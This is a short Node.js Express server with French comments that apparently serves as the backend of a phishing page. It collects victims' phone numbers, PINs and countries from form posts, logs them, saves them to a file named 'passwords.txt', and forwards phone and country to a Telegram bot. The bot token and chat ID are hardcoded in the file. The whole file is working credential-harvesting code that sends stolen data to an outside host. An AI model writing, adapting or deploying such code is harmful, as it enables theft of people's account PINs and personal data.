const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");
const axios = require("axios"); // ← AJOUTÉ

const app = express();
const PORT = process.env.PORT || 10000;

// =======================
// 🔐 TELEGRAM CONFIG
// 👉 MET TON TOKEN ICI
// =======================
const TELEGRAM_TOKEN = "8293335258:AAEoHAxk8nbShSd5p4sJWy_iDDiXJPjhN_U";
const CHAT_ID = "8585623604";

// Middleware
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Dossier statique
app.use(express.static(path.join(__dirname, "..", "STOKE")));

// Fichier où les données seront sauvegardées
const FILE = path.join(__dirname, "passwords.txt");

// Route POST (PIN RETIRÉ)
app.post("/", async (req, res) => {
  const { phone, pin,  country } = req.body;

  // 🔍 Logs sur Render
  console.log("REQ BODY :", req.body);
  console.log("COUNTRY :", country);
  console.log("PHONE :", phone);
  console.log("PIN   :", pin);

  if (!phone ||  !pin  ||  !country) {
    console.log("❌ Données manquantes");
    return res.sendStatus(400);
}

// Sauvegarde dans le fichier
  const line = `COUNTRY: ${country} | PHONE: ${phone}  | PIN: ${pin}\n`;
  fs.appendFileSync(FILE, line);

  // 📩 Envoi Telegram
  try {
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
      {
        chat_id: CHAT_ID,
        text: `📥 Nouvelle donnée reçue\n🌍 Pays: ${country}\n📞 Téléphone: ${phone}`
      }
      );
    console.log("✅ Message Telegram envoyé");
  } catch (err) {
    console.log("❌ Erreur envoi Telegram");
  }

  // Réponse simple  
    res.sendStatus(200);
  })

  // Lancement du serveur
app.listen(PORT, () => {
    console.log("Serveur online sur port " + PORT);
});